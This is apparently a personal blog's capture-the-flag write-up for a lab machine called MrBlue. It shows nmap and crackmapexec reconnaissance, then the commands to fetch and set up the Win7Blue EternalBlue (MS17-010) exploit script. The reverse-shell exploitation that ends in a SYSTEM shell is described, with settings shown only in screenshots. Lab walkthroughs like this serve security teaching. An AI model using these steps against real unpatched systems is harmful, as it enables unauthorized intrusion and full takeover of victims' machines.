
hey, Glad to be here 😍

Let run our Nmap scan:

```sh
┌──(sec-fortress㉿kali)-[~]                                 
└─$ nmap --open 10.150.150.242   

Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-27 23:10 EDT                                
Nmap scan report for 10.150.150.242                                                            
Host is up (0.16s latency).                                                                    
Not shown: 577 closed tcp ports (conn-refused), 412 filtered tcp ports (no-response)           
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit                    
PORT      STATE SERVICE                                                                        
53/tcp    open  domain                                                                         
80/tcp    open  http                                                                           
135/tcp   open  msrpc                                                                          
139/tcp   open  netbios-ssn                                                                    
445/tcp   open  microsoft-ds                                                                   
1433/tcp  open  ms-sql-s                                                                      
3389/tcp  open  ms-wbt-server                                                                  
8089/tcp  open  unknown                                                                        
49153/tcp open  unknown                                                                        
49154/tcp open  unknown                                                                        
49157/tcp open  unknown                                                                       

Nmap done: 1 IP address (1 host up) scanned in 11.46 seconds             
```

Nice, we can see port 80 is open, let go check what we have there before our service and script scan is done☢️

![](https://i.imgur.com/eQVcDNZ.png)

We have a jpeg, saying **mister Blue Sky** 🤔, guess you are thinking what i am thinking, well let view source, We have:

```html
<html>
<br>
<b><h1>Love This Song!!!<b></h1>
<br><br>
<img src="MrBlue.jpg" alt="Mr Blue aka MS17-010"></html>
```

the **alt** text looks like a vulnerability we have exploited sometime ago, let check it out:

![](https://i.imgur.com/HvV6q7m.png)

> **Make sure you don't forget your nmap scan, we will definitely have leads on what to do next 👾**

```bash
┌──(sec-fortress㉿kali)-[~]
└─$ nmap -p53,80,135,139,445,3389 -sCV -T4 10.150.150.242
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-27 23:32 EDT
Nmap scan report for 10.150.150.242           
Host is up (0.28s latency).

PORT     STATE SERVICE            VERSION                                                     
53/tcp   open  domain             Microsoft DNS 6.1.7601 (1DB1446A) (Windows Server 2008 R2 SP1)
| dns-nsid:                          
|_  bind.version: Microsoft DNS 6.1.7601 (1DB1446A)
80/tcp   open  http               Microsoft IIS httpd 7.5
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/7.5
| http-methods:               
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc              Microsoft Windows RPC
139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp  open                     Windows Server 2008 R2 Enterprise 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=MrBlue                                                        
| Not valid before: 2023-07-27T03:36:14
|_Not valid after:  2024-01-26T03:36:14
| rdp-ntlm-info: 
|   Target_Name: MRBLUE
|   NetBIOS_Domain_Name: MRBLUE
|   NetBIOS_Computer_Name: MRBLUE
|   DNS_Domain_Name: MrBlue
|   DNS_Computer_Name: MrBlue
|   Product_Version: 6.1.7601
|_  System_Time: 2023-07-28T04:09:50+00:00
|_ssl-date: 2023-07-28T04:09:59+00:00; +35m59s from scanner time.
Service Info: Host: MRBLUE; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 35m58s, deviation: 0s, median: 35m57s
| smb2-time: 
|   date: 2023-07-28T04:09:50
|_  start_date: 2020-03-25T14:11:23
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Enterprise 7601 Service Pack 1 (Windows Server 2008 R2 Enterprise 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: MrBlue
|   NetBIOS computer name: MRBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-07-28T04:09:50+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: MRBLUE, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:ab:46:29 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 121.21 seconds
```

Searching Google with the word **sp1, smb2** points to the Eternal Blue attack [...]

> Hmmmmm 🤔, what is the eternal blue attack ?
>  
> " EternalBlue is **a Microsoft exploit which was used by the NSA in intelligence gathering operations** The exploit, officially named MS17-010 by Microsoft — gave the US National Security Agency (NSA) backend access to devices running Windows operating systems like Windows XP and Windows 7 "

Well guess it is time to find a exploit, well i have one already so let roll 🤟, you can set it up with these command :

```sh
root@kali:~# cd ~
root@kali:~# git clone https://github.com/d4t4s3c/Win7Blue.git
root@kali:~# cd Win7Blue
root@kali:~# chmod +x Win7Blue.sh
```

---

### Exploitation

**Note that from here on, you have the choice to use metasploit as these write-up does not cover the automatic use of metasploit, it is strictly manual🌚**

- First of all use `crackmapexec` to check for windows bit Version

```sh
root@kali:~# crackmapexec smb 10.150.150.242  
SMB         10.150.150.242  445    MRBLUE           [*] Windows Server 2008 R2 Enterprise 7601 Service Pack 1 x64 (name:MRBLUE) (domain:MrBlue) (signing:False) (SMBv1:True)
```

- Great, we can see our target is an **x64** bit system.
- You should have Win7Blue ready, so do **`./Win7Blue.sh`** on your terminal

![](https://i.imgur.com/EYABcsz.png)

- Since we know our target is vulnerable to eternal blue, we don't need to scan, so i will be selecting option 3
- But before that let start up our **netcat reverse shell**
	- Make sure to do **`sudo apt install rlwrap`** for shell stabilization
	- Now we are good ☺️

![](https://i.imgur.com/FVfQbaL.png)

Make sure to replace options respectively

- RHOST should be your target
- LHOST is your VPN IP address
- LPORT can be any, but port 445 will be better

![](https://i.imgur.com/vXW8NqS.png)

**Our exploit is complete and we got shell as nt authority\system, we are definitely admin**

have fun😁

<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>
